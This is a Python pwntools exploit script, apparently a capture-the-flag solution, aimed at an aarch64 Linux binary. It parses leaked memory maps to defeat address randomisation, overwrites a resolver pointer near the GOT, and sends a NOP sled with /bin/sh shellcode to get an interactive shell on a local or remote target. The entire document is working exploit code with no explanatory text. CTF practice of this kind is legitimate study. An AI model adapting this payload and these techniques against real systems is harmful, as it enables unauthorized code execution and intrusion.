#!/usr/bin/env python3
from pwn import *

context(terminal=['tmux', 'split-pane', '-vb', '-p80'])
context(os="linux", arch="aarch64")

elf = context.binary = ELF('./runner_patched')
libc = ELF(args.libc) if args.libc else elf.libc
ld = ELF('lib/ld-linux-aarch64.so.1')
host, port = 'somehost', 1337

gs = '\n'.join([
    # 'cwatch execute vis',
    'cwatch execute "tel 0x5500021310"',
    'set breakpoint pending on',
    'b *0x55000212c0',
    'b *0x0000005500010c48',
    'b *0x55018441d0',
    'b *0x55018d09e0',
    'b exit',
    # 'continue',
])


def start():
  with context.quiet:
    if args.GDB:
      return gdb.debug(elf.path, gdbscript=gs, api=True)
    elif args.REMOTE:
      return remote(host, port)
    else:
      return process(elf.path)

def pause():
  if args.GDB:
    io.gdb.interrupt_and_wait()

io = start()

maps_data = io.recvuntil(b"exit").strip()
log.info(f"maps_data: {maps_data.decode()}")
maps = maps_data.split(b'\n')
elf_base = int(maps[0].split(b'-')[0], 16)
elf.address = elf_base

libc_base = int(maps[6].split(b'-')[0], 16)
libc.address = libc_base

ld_base = int(maps[3].split(b'-')[0], 16)
ld.address = ld_base


log.info(f"ld_base: {ld_base:#x}")
log.info(f"elf_base: {elf_base:#x}")
log.info(f"libc_base: {libc_base:#x}")

sp = ld_base - 0x6240
log.info(f"sp: {sp:#x}")
log.info(f"exit@got: {elf.got['exit']:#x} @libc: {libc.sym.exit:#x} and system@{libc.sym['system']:#x}")
binsh = next(libc.search(b'/bin/sh\x00'))

# io.sendlineafter(b">\n", f"{binsh-0x34:08x}".encode() + p64(libc.sym.system) * ((0x4000-16) // 8))
io.sendlineafter(b">\n", b"1337")

ld_resolver_ptr = elf.got.exit - 8
io.sendlineafter(b">\n", f"{ld_resolver_ptr:08x}".encode())

shellcode = asm(shellcraft.aarch64.linux.sh())
shellcode += b"\x00" * (0x58 - len(shellcode))

buffer_start = p64(sp + 0x28)
shellcode_ptr = p64(sp + 0x38)
nopsled = p32(0xd503201f) * (0x30 // 4)
attack_byte = p64(0xac)

payload = attack_byte  # skips stack 
payload += buffer_start 
payload += nopsled
payload += shellcode
payload += p64(elf.got.printf)
payload += shellcode_ptr

io.sendlineafter(b">\n", payload)
# io.sendlineafter(b">\n", b"\xac" + b"\x00" * 7 + buffer_start + nopsled + shellcode + p64(elf.got.printf) + shellcode_ptr * (0xa0 // 8)) 

io.interactive()
